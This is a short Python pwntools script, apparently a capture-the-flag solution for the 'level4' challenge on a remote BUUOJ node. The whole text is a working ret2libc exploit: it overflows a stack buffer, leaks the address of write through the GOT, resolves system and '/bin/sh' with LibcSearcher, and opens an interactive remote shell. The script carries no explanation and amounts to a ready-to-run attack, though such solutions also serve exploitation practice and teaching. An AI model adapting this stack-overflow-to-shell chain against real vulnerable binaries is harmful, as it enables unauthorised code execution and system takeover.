from pwn import *
from LibcSearcher import *

elf = ELF('./level4')
context.arch = 'i386'
r = remote('node3.buuoj.cn', 26641)

r.send('a' * 0x8C + flat([elf.plt['write'], elf.symbols['vulnerable_function'], 1, elf.got['write'], 4]))
write_addr = u32(r.recv(4))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
exit_addr = libc_base + libc.dump('exit')
r.send('a' * 0x8C + flat([system_addr, exit_addr, str_bin_sh]))
r.interactive()
